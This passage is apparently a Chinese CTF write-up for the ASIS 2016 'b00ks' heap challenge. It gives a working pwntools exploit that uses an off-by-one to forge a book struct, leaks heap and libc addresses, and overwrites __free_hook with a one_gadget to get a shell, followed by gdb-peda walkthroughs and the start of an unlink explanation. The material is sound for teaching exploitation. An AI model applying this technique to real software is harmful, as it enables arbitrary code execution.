        io.readuntil("> ")
        io.sendline("4")
        io.readuntil(": ")
        for i in range(id):
            book_id = int(io.readline()[:-1])
            io.readuntil(": ")
            book_name = io.readline()[:-1]
            io.readuntil(": ")
            book_des = io.readline()[:-1]
            io.readuntil(": ")
            book_author = io.readline()[:-1]
        return book_id, book_name, book_des, book_author
    def author_name(name):
        cmd(5)
        io.sendlineafter(": ", str(name))
    def exp():
        io.sendlineafter(": ", "author".rjust(0x20,'a'))
        create(48, '1a', 240, '1b') #1
        create(0x21000, '2a', 0x21000, '2b')#2
        book_id_1, book_name, book_des, book_author = printbook(1)
        first_heap = u64(book_author[32:32+6].ljust(8,'\x00'))
        io.success('first_heap: 0x%x' % first_heap)
        gdb.attach(io)
        payload =  'a'*0xa0 + p64(1) + p64(first_heap + 0x38) + p64(first_heap + 0x40) + p64(0xffff)
        edit(1, payload)
        author_name("author".rjust(0x20,'a'))
        book_id_1, book_name, book_des, book_author = printbook(1)
        book2_name_addr = u64(book_name.ljust(8,'\x00'))
        book2_des_addr = u64(book_des.ljust(8, '\x00'))
        io.success("book2 name addr: 0x%x" % book2_name_addr)
        io.success("book2 des addr: 0x%x" % book2_des_addr)
        libc_base = book2_des_addr - 0x5a8010
        io.success("libc_base: 0x%x" % libc_base)
        free_hook = libc_base + libc.symbols['__free_hook']
        offset = 0x45216 
        offset = 0x4526a 
        #offset = 0xf02a4 
        #offset = 0xf1147
        one_gadget = libc_base + offset
        io.success("free_hook addr: 0x%x" % free_hook)
        io.success("one_gadget addr: 0x%x" % one_gadget)
        payload = p64(free_hook)
        edit(1, payload)
        edit(2, p64(one_gadget))
        remove(2)
    if __name__ == '__main__':
        exp()
        io.interactive()
我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作
##### 填满author
    io.sendlineafter(": ", "author".rjust(0x20,'a'))
具体查找author位置可以跟我一样，find 字符串
    gdb-peda$ find author
    Searching for 'author' in: None ranges
    Found 8 results, display max 8 items:
    b00ks_debug : 0x555b3bcd83e1 ("author name")
    b00ks_debug : 0x555b3bcd8401 ("author name: ")
    b00ks_debug : 0x555b3bcd841c ("author_name")
    b00ks_debug : 0x555b3bed83e1 ("author name")
    b00ks_debug : 0x555b3bed8401 ("author name: ")
    b00ks_debug : 0x555b3bed841c ("author_name")
    b00ks_debug : 0x555b3bed905a --> 0xa160726f68747561 
        [stack] : 0x7ffed60b6406 ("author name: ")
这是创建一个堆块过后的效果，第三行便是book1结构体地址
    gdb-peda$ x/20gx 0x555b3bed905a-0x2-0x18
    0x555b3bed9040: 0x6161616161616161  0x6161616161616161
    0x555b3bed9050: 0x6161616161616161  0x726f687475616161
    0x555b3bed9060: 0x0000555b3bf8a160  0x0000000000000000
    0x555b3bed9070: 0x0000000000000000  0x0000000000000000
    0x555b3bed9080: 0x0000000000000000  0x0000000000000000
    0x555b3bed9090: 0x0000000000000000  0x0000000000000000
    0x555b3bed90a0: 0x0000000000000000  0x0000000000000000
    0x555b3bed90b0: 0x0000000000000000  0x0000000000000000
    0x555b3bed90c0: 0x0000000000000000  0x0000000000000000
    0x555b3bed90d0: 0x0000000000000000  0x0000000000000000
##### 创建堆块1
相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行
##### 泄露地址
这个不多讲
##### 通过edit伪造book结构体
    payload =  'a'*0xa0 + p64(1) + p64(first_heap + 0x38) + p64(first_heap + 0x40) + p64(0xffff)
        edit(1, payload)
这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体  
比如  
我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160  
那这时候我覆盖过后地址就变成[+] first_heap:
0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确
##### 这时候再次利用off by one
    author_name("author".rjust(0x20,'a'))
将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了
##### 这里部分就只是泄露了
    book_id_1, book_name, book_des, book_author = printbook(1)
        book2_name_addr = u64(book_name.ljust(8,'\x00'))
        book2_des_addr = u64(book_des.ljust(8, '\x00'))
        io.success("book2 name addr: 0x%x" % book2_name_addr)
        io.success("book2 des addr: 0x%x" % book2_des_addr)
        libc_base = book2_des_addr - 0x5a8010
        io.success("libc_base: 0x%x" % libc_base)
        free_hook = libc_base + libc.symbols['__free_hook']
        offset = 0x45216 
        offset = 0x4526a 
        #offset = 0xf02a4 
        #offset = 0xf1147
        one_gadget = libc_base + offset
        io.success("free_hook addr: 0x%x" % free_hook)
        io.success("one_gadget addr: 0x%x" % one_gadget)
这里那个固定偏移，第一部分libc_base我是通过vmmap获得libc基地址，然后我调试的时候减一下就获得这个固定偏移了
    gdb-peda$ vmmap
    Start              End                Perm  Name
    0x0000564350ee5000 0x0000564350ee7000 r-xp  /tmp/pwn/b00ks_debug
    0x00005643510e6000 0x00005643510e7000 r--p  /tmp/pwn/b00ks_debug
    0x00005643510e7000 0x00005643510e8000 rw-p  /tmp/pwn/b00ks_debug
    0x0000564351cdd000 0x0000564351cff000 rw-p  [heap]
    0x00007f2805862000 0x00007f2805a22000 r-xp  /home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so.6
    0x00007f2805a22000 0x00007f2805c22000 ---p  /home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so.6
    0x00007f2805c22000 0x00007f2805c26000 r--p  /home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so.6
    0x00007f2805c26000 0x00007f2805c28000 rw-p  /home/greenhand/Desktop/heap/off_by_one/Asis_2016_b00ks/libc.so.6
    0x00007f2805c28000 0x00007f2805c2c000 rw-p  mapped
    0x00007f2805c2c000 0x00007f2805c52000 r-xp  /tmp/ld.so.2
    0x00007f2805e0a000 0x00007f2805e51000 rw-p  mapped
    0x00007f2805e51000 0x00007f2805e52000 r--p  /tmp/ld.so.2
    0x00007f2805e52000 0x00007f2805e53000 rw-p  /tmp/ld.so.2
    0x00007f2805e53000 0x00007f2805e54000 rw-p  mapped
    0x00007ffd06df4000 0x00007ffd06e15000 rw-p  [stack]
    0x00007ffd06edc000 0x00007ffd06edf000 r--p  [vvar]
    0x00007ffd06edf000 0x00007ffd06ee1000 r-xp  [vdso]
在heap下面权限为r-xp的start部分的地址就是libc基地址了，  
然后任选一个泄露的  
[+] book2 name addr: 0x7f2805e2c010  
[+] book2 des addr: 0x7f2805e0a010  
我选了description部分的
    └──╼ $python
    Python 2.7.16 (default, Apr  6 2019, 01:42:57) 
    [GCC 8.3.0] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> hex(0x7f2805e0a010-0x00007f2805862000)
    '0x5a8010'
    >>>
就是这个固定偏移了
至于libc跟one_gadget偏移，用工具吧one_gadget
##### 最后任意地址写
  1. 先编辑book1的description改成free_hook地址，就是将book2的description指针指向free_hook
  2. 编辑book2的description，就是写入one_gadget了
  3. 最后在调用一次free就可以getshell了
        payload = p64(free_hook)
     edit(1, payload)
     edit(2, p64(one_gadget))
     remove(2)
#### unlink原理
void unlink(malloc_chunk _P, malloc_chunk_ BK, malloc_chunk *FD)
{
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;
}  
[ctf-wiki讲解原理](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)  
我觉得那张图配的十分好，就是双向链表的解链过程，好好理解，不理解没法搞下去
    struct chunk{
        int pre_size;
        int size;
        char *fd; //前驱指针 forward
        char *bk; // 后继指针 back
        数据部分
    }
大概就是这样，我创建三个这个结构体，a,b,c连接部分如下图，  
链表： abc  
将b从链表中解链就是unlink  
过程：